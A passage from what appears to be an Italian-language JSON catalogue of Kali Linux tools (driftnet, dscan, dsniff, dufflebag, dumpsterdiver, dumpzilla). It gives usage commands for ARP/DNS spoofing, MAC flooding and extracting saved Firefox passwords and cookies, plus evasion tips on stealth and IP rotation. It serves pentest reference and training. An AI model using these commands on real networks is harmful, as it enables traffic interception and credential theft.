automaticamente tutti i file estratti in una directory specificata, ideale per catture di lunga durata o ambienti senza display grafico. Le immagini vengono salvate con nomi univoci basati su timestamp per evitare sovrascritture.</p><p><strong>Sorgenti Multiple e Filtri:</strong> Driftnet puo operare su interfacce di rete live per cattura in tempo reale o processare file PCAP precedentemente catturati con strumenti come tcpdump o Wireshark. Supporta la specificazione di filtri BPF (Berkeley Packet Filter) per restringere il traffico analizzato a specifici host, porte o protocolli. Puo inoltre estrarre stream audio MPEG oltre alle immagini, e il framework e estensibile per supportare formati aggiuntivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Driftnet si utilizza specificando l'interfaccia di rete da monitorare o il file PCAP da analizzare. Richiede privilegi root o la capability CAP_NET_RAW per la cattura su interfacce live.</p><pre><code># Cattura live con visualizzazione grafica\nsudo driftnet -i eth0\n\n# Salvataggio automatico in directory senza display\nsudo driftnet -i eth0 -a -d /tmp/captured_images/\n\n# Analisi da file PCAP esistente\ndriftnet -f capture.pcap -a -d /tmp/images/\n\n# Cattura con verbose output\nsudo driftnet -i eth0 -v\n\n# Estrazione anche di stream audio\nsudo driftnet -i eth0 -a -d /tmp/media/ -m\n\n# Filtra solo traffico da un host specifico\nsudo driftnet -i eth0 -a -d /tmp/images/ -p \"host 192.168.1.100\"</code></pre><p>Per scenari MITM, Driftnet viene tipicamente utilizzato in combinazione con arpspoof (dalla suite dsniff) o ettercap per intercettare il traffico della vittima. La cattura e piu efficace su reti dove il traffico HTTP non cifrato e ancora prevalente, come reti legacy o segmenti con dispositivi IoT.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>Network Analysis</strong> durante penetration test interni, Driftnet fornisce una visualizzazione immediata e intuitiva del traffico HTTP intercettato, permettendo di valutare rapidamente il tipo di contenuti che transitano sulla rete. Questo e particolarmente utile per identificare applicazioni web interne non cifrate, portali legacy e comunicazioni in chiaro che rappresentano rischi di sicurezza.</p><p>In scenari di <strong>MITM</strong> (Man-in-the-Middle), combinato con strumenti di ARP spoofing, Driftnet mostra in tempo reale le immagini visualizzate dalla vittima, dimostrando concretamente l'impatto dell'intercettazione del traffico non cifrato. Questo approccio e particolarmente efficace in contesti di red team per documentare l'esposizione di dati sensibili trasmessi in chiaro.</p><p>Come strumento di <strong>Security Awareness</strong>, Driftnet e una delle demo piu visivamente impattanti per illustrare i rischi del traffico non cifrato. Mostrare in tempo reale le immagini estratte dal traffico di una rete durante sessioni di formazione sulla sicurezza ha un effetto comunicativo molto superiore a spiegazioni teoriche, motivando l'adozione di HTTPS e VPN.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Driftnet in modalita passiva (senza MITM) opera in modo completamente silenzioso sulla rete, poiche si limita a catturare traffico sull'interfaccia locale senza generare pacchetti aggiuntivi. Tuttavia, se utilizzato in combinazione con ARP spoofing per MITM, l'attivita di spoofing e facilmente rilevabile da sistemi IDS/IPS e da soluzioni di monitoraggio ARP. La modalita promiscua dell'interfaccia di rete potrebbe essere rilevata da alcuni strumenti di sicurezza.</p><p><strong>Impatto operativo:</strong> Lo strumento e inefficace contro traffico HTTPS, che rappresenta la maggioranza del traffico web moderno. La sua utilita e quindi limitata a reti con traffico HTTP in chiaro, tipicamente reti interne legacy, segmenti IoT o comunicazioni con dispositivi embedded. In scenari MITM, l'ARP spoofing puo causare instabilita di rete e rallentamenti percepibili dagli utenti.</p><p><strong>Mitigazioni:</strong> Per operazioni stealth, evitare il MITM attivo e limitarsi alla cattura passiva su segmenti di rete dove il traffico e gia visibile (port mirroring, hub, o accesso fisico allo switch). Utilizzare interfacce di rete dedicate in modalita monitor per evitare che il sistema operativo risponda a traffico non destinato ad esso. Per analisi post-cattura, preferire la modalita file PCAP che non richiede accesso live alla rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "dscan",
    "name": "dscan",
    "version": "0.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dscan/",
    "desc": "Scanner distribuito per ricognizione su larga scala con worker multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DScan</strong> e uno scanner di rete distribuito progettato per operazioni di ricognizione su larga scala che richiedono la scansione di range IP estesi in tempi ragionevoli. Il tool implementa un'architettura master/worker dove un nodo master coordina e distribuisce i task di scansione tra worker multipli, ciascuno dei quali esegue la propria porzione di scansione utilizzando Nmap come motore di scanning sottostante. Questa architettura distribuita permette di parallelizzare la ricognizione su macchine multiple, riducendo drasticamente i tempi di completamento per scansioni di reti di classe B o superiore. Il coordinamento centralizzato dei risultati assicura che tutti i dati raccolti dai worker vengano aggregati in un unico report coerente, facilitando l'analisi post-scansione. DScan e particolarmente utile in contesti di red team o bug bounty dove la superficie di attacco comprende migliaia o milioni di indirizzi IP.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Architettura Master/Worker Distribuita:</strong> DScan separa la logica di coordinamento (master) dall'esecuzione effettiva delle scansioni (worker). Il master gestisce la coda dei task, distribuisce i range IP tra i worker disponibili, monitora lo stato di avanzamento e raccoglie i risultati. I worker si connettono al master, ricevono i loro task e eseguono le scansioni localmente utilizzando Nmap. Questa separazione permette di scalare orizzontalmente aggiungendo worker su macchine diverse, sfruttando la larghezza di banda aggregata di piu connessioni di rete.</p><p><strong>Integrazione Nmap e Task Distribution:</strong> DScan utilizza Nmap come backend per le scansioni effettive, ereditandone tutte le capacita di discovery, port scanning e service detection. Il master suddivide automaticamente i range IP target in blocchi di dimensioni configurabili e li assegna ai worker in modo bilanciato. Supporta il passaggio di opzioni Nmap custom ai worker, permettendo di configurare il tipo di scansione (SYN, connect, UDP), le porte da scansionare, la velocita e le opzioni di service/version detection secondo le necessita dell'operazione.</p><p><strong>Aggregazione Risultati e Reporting:</strong> I risultati delle scansioni individuali eseguite dai worker vengono trasmessi al master per l'aggregazione in un dataset unificato. Il master gestisce la deduplicazione dei risultati, la risoluzione di conflitti (quando lo stesso target viene scansionato da worker diversi) e la generazione di report consolidati. I risultati finali sono esportabili in formati standard compatibili con altri strumenti di analisi, facilitando l'integrazione nel workflow complessivo di penetration testing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo di DScan prevede l'avvio di un nodo master che coordina le operazioni, seguito dall'avvio di uno o piu worker che si connettono al master e attendono task. Una volta che l'infrastruttura distribuita e attiva, si avvia la scansione specificando i target e le opzioni desiderate.</p><pre><code># Avvio del nodo master sulla porta 8080\ndscan master -p 8080\n\n# Avvio di un worker connesso al master\ndscan worker -m master_ip:8080\n\n# Avvio scansione con file target e range porte\ndscan scan -t targets.txt --ports 1-1000\n\n# Scansione con opzioni Nmap per service detection\ndscan scan -t 10.0.0.0/8 --nmap-opts \"-sV -sC --version-intensity 5\"\n\n# Scansione solo top 100 porte con timing aggressivo\ndscan scan -t 192.168.0.0/16 --nmap-opts \"-T4 --top-ports 100\"\n\n# Scansione UDP su porte specifiche\ndscan scan -t targets.txt --nmap-opts \"-sU -p 53,161,500\"</code></pre><p>Per ottenere i migliori risultati, distribuire i worker su macchine con connessioni di rete diverse per massimizzare il throughput aggregato e ridurre il rischio di saturare una singola connessione. Monitorare l'avanzamento tramite l'interfaccia del master per identificare worker lenti o problematici.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per la <strong>Large Scale Reconnaissance</strong> in ambito red team o bug bounty, DScan permette di scansionare range IP molto ampi (classi B o A) in tempi ragionevoli distribuendo il carico su worker multipli. Questa capacita e essenziale quando la superficie di attacco comprende migliaia di indirizzi IP e la ricognizione deve essere completata entro finestre temporali limitate. La parallelizzazione riduce tempi che con un singolo scanner richiederebbero giorni a poche ore.</p><p>In operazioni di <strong>Red Team</strong> su larga scala, DScan accelera la fase iniziale di discovery permettendo di identificare rapidamente tutti i servizi esposti nell'infrastruttura target. Distribuendo i worker su nodi di rete diversi, e possibile ottenere scansioni da prospettive multiple e con IP sorgente differenti, fornendo una visione piu completa e riducendo il rischio che un singolo punto di scansione venga bloccato.</p><p>Per <strong>Continuous Security Monitoring</strong>, DScan puo essere configurato per eseguire scansioni periodiche dell'intera infrastruttura, identificando rapidamente nuovi servizi esposti, porte aperte non autorizzate o cambiamenti nella superficie di attacco. L'architettura distribuita rende questo approccio scalabile anche per organizzazioni con reti molto estese.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni Nmap distribuite generano un volume significativo di traffico di rete che e facilmente rilevabile da sistemi IDS/IPS e soluzioni di network monitoring. Anche se distribuite su IP sorgente multipli, le scansioni possono essere correlate analizzando i pattern temporali, le porte target e il comportamento dei pacchetti. Molte organizzazioni implementano sistemi di rilevamento che aggregano e correlano automaticamente scansioni provenienti da sorgenti diverse.</p><p><strong>Impatto operativo:</strong> Scansioni distribuite su larga scala possono generare un carico significativo sull'infrastruttura di rete target, potenzialmente causando rallentamenti o interruzioni di servizio su dispositivi con risorse limitate. Il traffico generato puo saturare la larghezza di banda del segmento di rete target e attivare meccanismi di protezione automatica come rate limiting o blackholing degli IP sorgente.</p><p><strong>Mitigazioni:</strong> Utilizzare timing conservativi (-T2 o inferiore) per ridurre il volume di traffico istantaneo. Distribuire le scansioni su periodi di tempo prolungati per mimetizzarsi nel traffico di rete normale. Implementare source IP rotation sui worker per evitare che un singolo IP generi troppo traffico verso il target. Limitare le porte scansionate al minimo necessario e preferire scansioni mirate basate su intelligence precedente piuttosto che scansioni complete su tutti i range. Coordinare con il team di rete del cliente per evitare impatti sui servizi di produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "dsniff",
    "name": "dsniff",
    "version": "2.4b1",
    "icon": "../app/icons/dsniff-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dsniff/",
    "desc": "Suite di tool per sniffing password e MITM: arpspoof, macof, urlsnarf.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dsniff</strong> e una suite storica e fondamentale di strumenti per network auditing e penetration testing, sviluppata da Dug Song alla fine degli anni '90. Nonostante la sua eta, la suite rimane rilevante e ampiamente utilizzata, comprendendo una collezione di tool specializzati per l'intercettazione di credenziali, l'esecuzione di attacchi Man-in-the-Middle (MITM) e l'analisi del traffico di rete. La suite include strumenti iconici come arpspoof per il poisoning ARP, dnsspoof per la manipolazione delle risposte DNS, macof per il MAC flooding degli switch, e lo sniffer dsniff stesso per il recupero di password trasmesse in chiaro su protocolli come FTP, Telnet, HTTP, SNMP, POP, IMAP e molti altri. Completano la suite utility come urlsnarf per il logging di URL HTTP, filesnarf per l'estrazione di file da sessioni NFS, e webspy per la visualizzazione in tempo reale della navigazione della vittima. La suite ha definito molte delle tecniche di attacco di rete ancora utilizzate oggi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>ARP Spoofing e DNS Spoofing:</strong> arpspoof e il componente piu utilizzato della suite, che esegue ARP cache poisoning per posizionare l'attaccante come Man-in-the-Middle tra due host sulla rete locale (tipicamente la vittima e il gateway). Una volta stabilito il MITM, tutto il traffico della vittima transita attraverso la macchina dell'attaccante, dove puo essere analizzato, modificato o registrato. dnsspoof complementa arpspoof intercettando le query DNS della vittima e rispondendo con record falsificati, permettendo di reindirizzare il traffico verso server controllati dall'attaccante per phishing o credential harvesting.</p><p><strong>Password Sniffing Multi-Protocollo:</strong> Lo strumento dsniff monitora il traffico di rete e estrae automaticamente credenziali trasmesse in chiaro o con cifratura debole da una vasta gamma di protocolli: FTP, Telnet, HTTP (Basic e Form), SNMP, IMAP, POP, NNTP, LDAP, Rlogin, RPC, NFS, YP/NIS, OSPF, PPTP e X11. Il tool riconosce automaticamente il protocollo e formatta le credenziali estratte in modo leggibile, fornendo username, password e host di destinazione.</p><p><strong>MAC Flooding e Utility di Rete:</strong> macof genera un flood di frame Ethernet con indirizzi MAC casuali per riempire la CAM table degli switch di rete, forzandoli a comportarsi come hub e rendendo tutto il traffico visibile a tutti gli host connessi. urlsnarf cattura e registra tutti gli URL HTTP in formato CLF (Common Log Format) compatibile con analizzatori di log web. filesnarf estrae file trasmessi tramite NFS in tempo reale. webspy visualizza la navigazione web della vittima in tempo reale aprendo le stesse pagine nel browser dell'attaccante. Ogni componente e progettato per un compito specifico, ma l'efficacia massima si raggiunge combinando piu strumenti della suite.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I tool della suite dsniff vengono tipicamente utilizzati in combinazione. Lo scenario classico prevede l'attivazione di arpspoof per il MITM, seguita dall'esecuzione parallela di uno o piu sniffer per l'analisi del traffico intercettato. E necessario abilitare il forwarding IP per mantenere la connettivita della vittima.</p><pre><code># Abilita IP forwarding (prerequisito per MITM)\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# ARP spoofing bidirezionale per MITM completo\narpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &\narpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &\n\n# Password sniffing su protocolli multipli\ndsniff -i eth0\n\n# MAC flooding per overflow CAM table\nmacof -i eth0\n\n# Cattura URL HTTP in formato log\nurlsnarf -i eth0\n\n# DNS spoofing con hosts file personalizzato\ndnsspoof -i eth0 -f hosts_malevoli.txt\n\n# Estrazione file da sessioni NFS\nfilesnarf -i eth0</code></pre><p>E fondamentale eseguire arpspoof in entrambe le direzioni (victim-to-gateway e gateway-to-victim) per un MITM completo bidirezionale. Senza IP forwarding, il traffico della vittima sara interrotto. Dopo il completamento dell'attacco, fermare arpspoof per permettere il ripristino delle cache ARP.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MITM Attacks</strong> su reti locali, arpspoof rimane lo strumento di riferimento per il posizionamento come Man-in-the-Middle. Nonostante l'eta, la tecnica di ARP poisoning e ancora efficace su reti che non implementano protezioni come Dynamic ARP Inspection (DAI) o 802.1X. Una volta stabilito il MITM, gli altri tool della suite permettono di estrarre credenziali, monitorare la navigazione e intercettare comunicazioni in chiaro.</p><p>Nel <strong>Network Penetration Testing</strong> di reti interne, macof permette di testare la resilienza degli switch di rete al MAC flooding, verificando se i dispositivi cadono in modalita fail-open (comportamento hub) quando la CAM table e piena. Questo test e fondamentale per valutare la segmentazione di rete e l'efficacia delle protezioni a livello 2 implementate nell'infrastruttura.</p><p>Per <strong>formazione e awareness</strong>, la suite dsniff e uno strumento didattico eccellente per dimostrare concretamente le vulnerabilita dei protocolli di rete. La semplicita d'uso e l'immediatezza dei risultati permettono di illustrare in modo tangibile i rischi dell'ARP spoofing, del traffico non cifrato e della mancanza di autenticazione a livello 2, motivando l'adozione di contromisure appropriate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'ARP spoofing e una delle tecniche piu facilmente rilevabili in una rete. Sistemi IDS come Snort, soluzioni di Network Access Control e strumenti specifici come arpwatch rilevano immediatamente il poisoning delle cache ARP. Il MAC flooding genera un volume anomalo di traffico che causa alert immediati su qualsiasi sistema di monitoraggio di rete. Anche il DNS spoofing e facilmente identificabile confrontando le risposte con quelle di server DNS legittimi.</p><p><strong>Impatto operativo:</strong> L'ARP spoofing puo causare instabilita di rete e perdita di pacchetti se il forwarding non e configurato correttamente. Il MAC flooding puo degradare significativamente le prestazioni dell'intero segmento di rete, causando rallentamenti percepibili e potenzialmente interruzioni di servizio. Queste tecniche sono intrinsecamente distruttive e difficili da eseguire in modo discreto. Su switch moderni con protezioni di porta, il MAC flooding puo causare il blocco della porta dell'attaccante.</p><p><strong>Mitigazioni:</strong> Per penetration test autorizzati, concordare preventivamente con il cliente i test a livello 2 e le potenziali interruzioni. Limitare l'ARP spoofing a target specifici anziche eseguire poisoning broadcast. Evitare il MAC flooding in ambienti di produzione a meno che non sia esplicitamente richiesto. Preferire tecniche di MITM meno invasive come LLMNR/NBT-NS poisoning (Responder) su reti Windows. Utilizzare la suite durante finestre di manutenzione o su segmenti di rete isolati per minimizzare l'impatto. Monitorare attentamente lo stato della rete durante l'utilizzo e essere pronti a interrompere immediatamente in caso di degradazione del servizio.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "dufflebag",
    "name": "dufflebag",
    "version": "0.0~git20200205.9a01942",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dufflebag/",
    "desc": "Cerca secret e credenziali in snapshot EBS pubblici di AWS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dufflebag</strong> è uno strumento sviluppato da Bishop Fox per individuare credenziali e dati sensibili esposti in snapshot <strong>EBS (Elastic Block Store)</strong> pubblici su Amazon Web Services. Il problema che risolve è concreto: molte organizzazioni rendono accidentalmente pubblici i propri snapshot EBS (backup dei volumi disco delle istanze EC2), esponendo potenzialmente password, chiavi API, certificati SSL, chiavi SSH e altri secret contenuti nei file system. Dufflebag automatizza il processo di ricerca, montaggio e scansione di questi snapshot, identificando rapidamente le esposizioni di credenziali su larga scala. Scritto in Go, è progettato per operare efficientemente su grandi volumi di dati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated EBS Mounting:</strong> Crea automaticamente volumi EBS a partire dagli snapshot pubblici trovati, li monta su un'istanza EC2 worker, esegue la scansione e poi li smonta e cancella. L'intero ciclo di vita del volume è gestito senza intervento manuale.</p><p><strong>Secret Detection Engine:</strong> Scansiona i file system montati alla ricerca di pattern noti di credenziali: chiavi API AWS (AKIA...), chiavi SSH private (-----BEGIN RSA PRIVATE KEY-----), file <code>.env</code>, configurazioni di database con password in chiaro, token OAuth, certificati SSL/TLS e wallet di criptovalute.</p><p><strong>Multi-Region Scanning:</strong> Può scansionare snapshot pubblici in tutte le regioni AWS simultaneamente, massimizzando la copertura. Gli snapshot EBS sono regionali, quindi è necessario cercare in ogni regione separatamente.</p><p><strong>Pattern Personalizzabili:</strong> Le regex di ricerca sono configurabili tramite file di pattern esterni, permettendo di aggiungere ricerche specifiche per il contesto (es. token proprietari, formati di credenziali custom).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede credenziali AWS con permessi EC2 (per creare volumi e istanze). Va eseguito preferibilmente su un'istanza EC2 nella stessa regione degli snapshot target per ridurre costi e latenza.</p><pre><code># Configurare credenziali AWS\nexport AWS_ACCESS_KEY_ID=AKIAXXXXXXXXX\nexport AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxx\n\n# Cercare e scansionare snapshot pubblici nella regione corrente\ndufflebag search\n\n# Scansionare uno snapshot specifico per ID\ndufflebag scan snap-0123456789abcdef0\n\n# Cercare in una regione specifica\ndufflebag search --region eu-west-1\n\n# Usare pattern di ricerca personalizzati\ndufflebag scan snap-xxx --patterns custom_patterns.txt\n\n# Output dettagliato con percorsi dei file trovati\ndufflebag search --verbose</code></pre><p>I risultati mostrano lo snapshot ID, il percorso del file contenente il secret, il tipo di credenziale trovata e un estratto del contenuto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Cloud Penetration Testing:</strong> Durante un assessment AWS, Dufflebag permette di verificare se l'organizzazione target ha snapshot EBS pubblici contenenti credenziali. Questo è un vettore di attacco reale e documentato in numerosi data breach.</p><p><strong>Bug Bounty:</strong> Molti programmi di bug bounty includono l'infrastruttura cloud nel scope. Trovare credenziali in snapshot pubblici è un finding di severità critica, spesso premiato con bounty elevati.</p><p><strong>Cloud Security Audit:</strong> Per i Blue Team, Dufflebag può essere usato in modo proattivo per verificare che i propri snapshot EBS non siano accidentalmente pubblici e non contengano secret esposti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Costi AWS:</strong> Ogni snapshot montato genera costi per il volume EBS creato e per l'I/O. Scansionare migliaia di snapshot può diventare costoso rapidamente. Monitorare il billing AWS durante l'utilizzo.</p><p><strong>Legalità:</strong> Gli snapshot pubblici sono accessibili a chiunque per design, ma l'utilizzo delle credenziali trovate per accedere a sistemi non autorizzati è illegale. Documentare i finding e segnalarli responsabilmente.</p><p><strong>Tracciabilità:</strong> Tutte le operazioni vengono loggate in AWS CloudTrail dell'account utilizzato. L'account AWS usato per la scansione è completamente tracciabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Cloud_Enum"
    ],
    "notes": null
  },
  {
    "id": "dumpsterdiver",
    "name": "dumpsterdiver",
    "version": "0~git20200911",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dumpsterdiver/",
    "desc": "Cerca secret, API key e credenziali hardcoded in repository e file.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DumpsterDiver</strong> è uno strumento Python progettato per individuare credenziali hardcoded, chiavi API, token e altri secret nascosti all'interno di file e repository di codice sorgente. Utilizza una combinazione di <strong>entropy analysis</strong> (misura la casualità delle stringhe per identificare possibili secret) e <strong>pattern matching</strong> (cerca formati noti di credenziali) per scansionare ricorsivamente directory, archivi compressi e cronologia Git. A differenza di tool simili come TruffleHog che si concentrano sulla storia Git, DumpsterDiver analizza qualsiasi tipo di file, inclusi binari, documenti e archivi compressi, rendendolo versatile per scenari diversi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Entropy Analysis:</strong> Calcola l'entropia di Shannon per ogni stringa trovata nei file. Stringhe con entropia superiore a una soglia configurabile (default 4.0) vengono segnalate come possibili secret. Chiavi API e password generate casualmente hanno tipicamente entropia alta (> 4.5), mentre testo normale ha entropia bassa (< 3.5).</p><p><strong>Pattern Matching Avanzato:</strong> Include regole predefinite per identificare formati noti: chiavi AWS (AKIA...), token GitHub (ghp_...), chiavi private RSA/EC, connessioni database (mongodb://, mysql://), token JWT e molti altri. Le regole sono estensibili tramite file di configurazione.</p><p><strong>Archive Unpacking:</strong> Decomprime ed analizza automaticamente archivi ZIP, TAR, GZ, BZ2 e 7Z, cercando secret anche all'interno di file compressi annidati. Questo è particolarmente utile per analizzare backup e pacchetti di distribuzione.</p><p><strong>Git History Scanning:</strong> Analizza l'intera cronologia dei commit di un repository Git, cercando secret che potrebbero essere stati committati accidentalmente e poi rimossi. I secret rimossi dal codice ma presenti nella history sono ancora recuperabili e rappresentano un rischio concreto.</p><p><strong>Filtri Personalizzabili:</strong> Permette di specificare estensioni file da includere/escludere, lunghezza minima delle stringhe da analizzare, e soglie di entropia separate per diversi tipi di file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Installare le dipendenze Python e lanciare lo script sulla directory o repository target.</p><pre><code># Installazione\npip3 install -r requirements.txt\n\n# Scansione standard di una directory\npython3 DumpsterDiver.py -p /path/to/project\n\n# Scansione con soglia di entropia personalizzata\npython3 DumpsterDiver.py -p ./repo -e 4.5\n\n# Cercare solo pattern specifici (senza entropy analysis)\npython3 DumpsterDiver.py -p ./code --grep 'api_key|secret_key|password'\n\n# Analizzare archivi compressi\npython3 DumpsterDiver.py -p /path/to/backups --archive\n\n# Output in formato JSON per integrazione con altri tool\npython3 DumpsterDiver.py -p ./repo -o results.json\n\n# Escludere file binari e immagini\npython3 DumpsterDiver.py -p ./project --exclude-extensions .jpg,.png,.exe</code></pre><p>L'output elenca i file contenenti possibili secret, la stringa sospetta, il valore di entropia calcolato e il tipo di pattern matchato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Code Review di Sicurezza:</strong> Prima di rendere pubblico un repository o durante un audit di sicurezza, DumpsterDiver verifica l'assenza di credenziali hardcoded nel codice sorgente. Trova secret che gli sviluppatori hanno dimenticato di rimuovere.</p><p><strong>Bug Bounty:</strong> Scansionare repository pubblici di organizzazioni target alla ricerca di chiavi API, token di accesso o credenziali di database committate per errore. Finding di questo tipo hanno severità critica.</p><p><strong>DevSecOps Pipeline:</strong> Integrabile in pipeline CI/CD come check pre-commit o pre-merge per bloccare automaticamente l'inserimento di secret nel codice sorgente.</p><p><strong>Incident Response:</strong> Dopo una compromissione, analizzare il codice sorgente dell'organizzazione per identificare tutte le credenziali potenzialmente esposte che necessitano di rotazione immediata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Falsi Positivi:</strong> L'entropy analysis genera inevitabilmente falsi positivi, specialmente con stringhe codificate in Base64, hash e UUID. È necessaria una review manuale dei risultati per separare i veri secret dai falsi allarmi. Calibrare la soglia di entropia aiuta a ridurre il rumore.</p><p><strong>Performance:</strong> La scansione di repository molto grandi o con molti archivi compressi può richiedere tempo significativo. Usare i filtri per escludere file non rilevanti (immagini, binari compilati) migliora le performance.</p><p><strong>Sensibilità dei risultati:</strong> I report generati contengono i secret trovati in chiaro. Proteggere adeguatamente i file di output e non condividerli su canali non sicuri.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "dumpzilla",
    "name": "dumpzilla",
    "version": "20210311",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dumpzilla/",
    "desc": "Estrae cronologia, password, cookie e download dai profili Firefox.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dumpzilla</strong> è uno strumento forense Python specializzato nell'estrazione e analisi di informazioni dai profili <strong>Firefox e Iceweasel</strong>. Firefox memorizza una grande quantità di dati dell'utente in database SQLite e file JSON all'interno della cartella profilo (<code>~/.mozilla/firefox/xxxx.default/</code>). Dumpzilla analizza sistematicamente tutti questi file, estraendo cronologia di navigazione, password salvate, cookie, sessioni aperte, download, dati dei form, addon installati, certificati e preferenze. È uno strumento fondamentale nella digital forensics per ricostruire l'attività web di un utente, e nella post-exploitation per recuperare credenziali salvate nel browser.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Extraction:</strong> Estrae e decripta le password salvate nel password manager di Firefox, leggendo i file <code>logins.json</code> e <code>key4.db</code>. Se non è impostata una Master Password, le credenziali vengono mostrate in chiaro. Se la Master Password è presente, viene segnalata ma le password non sono decriptabili senza di essa.</p><p><strong>History Analysis:</strong> Estrae la cronologia completa di navigazione dal database <code>places.sqlite</code>, includendo URL, titolo della pagina, numero di visite, timestamp della prima e ultima visita. Permette di filtrare per intervallo temporale e dominio.</p><p><strong>Cookie Dump:</strong> Recupera tutti i cookie dal database <code>cookies.sqlite</code>, mostrando dominio, nome, valore, data di creazione, scadenza e flag (HttpOnly, Secure, SameSite). Cookie di sessione attivi possono essere riutilizzati per session hijacking.</p><p><strong>Form Data Recovery:</strong> Estrae i dati inseriti nei form HTML (campi di ricerca, username, indirizzi) dal file <code>formhistory.sqlite</code>, utile per ricostruire l'attività dell'utente.</p><p><strong>Session & Tab Restore:</strong> Analizza il file <code>sessionstore.jsonlz4</code> per recuperare le schede aperte e chiuse di recente, inclusi URL e dati dei form non ancora inviati.</p><p><strong>Addon & Extension Analysis:</strong> Elenca tutti gli addon e le estensioni installate, utile per identificare estensioni malevole o strumenti di privacy che l'utente utilizza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Puntare Dumpzilla alla cartella del profilo Firefox da analizzare.</p><pre><code># Dump completo di tutte le informazioni del profilo\npython3 dumpzilla.py /home/user/.mozilla/firefox/xxxx.default/\n\n# Estrarre solo le password salvate\npython3 dumpzilla.py /path/to/profile --Passwords\n\n# Cookie e sessioni attive\npython3 dumpzilla.py /path/to/profile --Cookies --Session\n\n# Cronologia di navigazione con timestamp\npython3 dumpzilla.py /path/to/profile --History\n\n# Download effettuati\npython3 dumpzilla.py /path/to/profile --Downloads\n\n# Filtrare per intervallo di date\npython3 dumpzilla.py /path/to/profile --History --range-history 2024-01-01 2024-12-31\n\n# Esportare in formato CSV\npython3 dumpzilla.py /path/to/profile --All -o report.csv</code></pre><p>L'output è organizzato per categoria e include timestamp dettagliati per ogni elemento estratto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Digital Forensics:</strong> Ricostruzione dell'attività web di un sospetto durante un'indagine. La cronologia, i download e i cookie raccontano una storia dettagliata del comportamento online dell'utente, con timestamp precisi.</p><p><strong>Post-Exploitation:</strong> Dopo aver ottenuto accesso a un sistema, estrarre le password salvate in Firefox permette spesso di ottenere credenziali per altri servizi (password reuse). I cookie di sessione attivi possono essere usati per impersonare l'utente su siti web senza conoscere la password.</p><p><strong>Incident Response:</strong> Analizzare il browser di una workstation compromessa per determinare quali siti l'utente ha visitato, se ha scaricato file malevoli, e quali credenziali potrebbero essere state esposte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso al profilo:</strong> Richiede accesso in lettura alla cartella del profilo Firefox. Su sistemi live, il profilo potrebbe essere bloccato dal processo Firefox in esecuzione. In quel caso, copiare la cartella profilo prima dell'analisi.</p><p><strong>Master Password:</strong> Se l'utente ha configurato una Master Password in Firefox, le password salvate non possono essere decriptate senza di essa. Gli altri dati (cronologia, cookie, form) restano comunque accessibili.</p><p><strong>Tracce:</strong> Dumpzilla è un tool di sola lettura, non modifica il profilo analizzato. Tuttavia, l'accesso ai file del profilo viene registrato nei metadati di accesso del file system (atime).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
